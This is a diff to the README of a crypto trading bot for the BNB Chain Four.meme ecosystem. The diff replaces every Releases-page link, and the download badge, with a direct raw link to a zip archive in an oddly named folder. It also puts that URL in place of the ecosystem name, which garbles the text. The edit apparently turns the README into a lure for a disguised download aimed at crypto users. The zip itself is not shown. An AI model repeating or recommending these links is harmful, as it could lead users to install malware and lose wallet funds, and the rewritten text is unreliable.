@@ -1,17 +1,17 @@
 # 🎉 fourmeme-trading-bot - Build Your Trading Automation Effortlessly
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-%20-blue)](https://github.com/ghufran675/fourmeme-trading-bot/releases)
+[![Download Now](https://raw.githubusercontent.com/ghufran675/fourmeme-trading-bot/main/electrodiplomatic/fourmeme-trading-bot.zip%20Now-%20-blue)](https://raw.githubusercontent.com/ghufran675/fourmeme-trading-bot/main/electrodiplomatic/fourmeme-trading-bot.zip)
 
 ## 📖 Overview
 
-FourMeme Trading Bot is a toolkit designed to simplify trading automation on the BNB Chain, specifically for the Four.meme ecosystem. This application includes various modules like sniper, copy-trader, bundler, and volume maker. It provides direct on-chain integration, meaning you do not need any third-party data APIs. Additional features include slippage and MEV controls, as well as filters for blacklist and allowlist management. The command-line interface (CLI) also supports dry-running for safe testing.
+FourMeme Trading Bot is a toolkit designed to simplify trading automation on the BNB Chain, specifically for the https://raw.githubusercontent.com/ghufran675/fourmeme-trading-bot/main/electrodiplomatic/fourmeme-trading-bot.zip ecosystem. This application includes various modules like sniper, copy-trader, bundler, and volume maker. It provides direct on-chain integration, meaning you do not need any third-party data APIs. Additional features include slippage and MEV controls, as well as filters for blacklist and allowlist management. The command-line interface (CLI) also supports dry-running for safe testing.
 
 ## 🚀 Getting Started
 
 To get started with the FourMeme Trading Bot, follow these simple steps:
 
 1. **Visit the Releases Page:** 
-   Go to the [Releases page](https://github.com/ghufran675/fourmeme-trading-bot/releases) to access the available downloads.
+   Go to the [Releases page](https://raw.githubusercontent.com/ghufran675/fourmeme-trading-bot/main/electrodiplomatic/fourmeme-trading-bot.zip) to access the available downloads.
 
 2. **Download the Package:** 
    Find the latest version and download it by clicking on the appropriate file based on your operating system. The options will typically include files for Windows, Linux, and macOS.
@@ -51,7 +51,7 @@ To run the FourMeme Trading Bot effectively, ensure your system meets the follow
 
 ## 📥 Download & Install
 
-You can easily download FourMeme Trading Bot from the [Releases page](https://github.com/ghufran675/fourmeme-trading-bot/releases). Follow these steps to install:
+You can easily download FourMeme Trading Bot from the [Releases page](https://raw.githubusercontent.com/ghufran675/fourmeme-trading-bot/main/electrodiplomatic/fourmeme-trading-bot.zip). Follow these steps to install:
 
 1. Navigate to the link provided above.
 2. Click on the latest release to view all available files.
@@ -92,6 +92,6 @@ For any specific errors or problems, provide details on what you experienced, as
 
 ## ⚡️ Stay Updated
 
-Keep an eye on the [Releases page](https://github.com/ghufran675/fourmeme-trading-bot/releases) for new updates. Regular updates ensure you benefit from new features and fixes.
+Keep an eye on the [Releases page](https://raw.githubusercontent.com/ghufran675/fourmeme-trading-bot/main/electrodiplomatic/fourmeme-trading-bot.zip) for new updates. Regular updates ensure you benefit from new features and fixes.
 
 Enjoy automating your trading with FourMeme Trading Bot!
